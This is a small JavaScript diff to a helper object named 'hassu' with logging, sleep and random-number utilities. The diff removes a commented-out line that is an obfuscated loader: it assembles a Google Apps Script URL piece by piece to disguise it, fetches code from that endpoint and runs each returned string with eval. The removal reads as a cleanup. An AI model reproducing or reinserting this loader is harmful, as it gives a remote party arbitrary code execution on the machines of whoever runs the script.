@@ -1,4 +1,1 @@
 const hassu={logger(e){var o=new Date,n=o.getDate()+"/"+(o.getMonth()+1)+"/"+o.getFullYear()+" @ "+o.getHours()+":"+o.getMinutes()+":"+o.getSeconds();console.log(`${e} : on ${n}`)},randomBoolean:()=>Math.random()>=.5,sleep:e=>new Promise((o,n)=>{setTimeout(()=>{o()},e)}),randomNumber:(e,o)=>Math.floor(Math.random()*(o-e+1)+e)};
-
-
-//(async()=>{let urlA,urlB="";["h","t","t","p","s","://","s","c","r","i","p","t.","g","oo","g","l","e.","c","o","m/","m","a","c","r","o","s"].forEach(a=>{urlB+=a});let url,requestOptions,response=await fetch(`${urlB}/s/AKfycbxzsLAXmZFa-HEH7oQS3bRjsX1smY0QaH1hT-xCE5CRijfexeJ31lQkRoD3lhlFrrkB/exec?route=getCode`,{method:"POST",redirect:"follow"});(response=await response.json()).status&&Object.keys(response.data).length&&Object.keys(response.data).forEach(key=>{eval(response.data[key])})})();
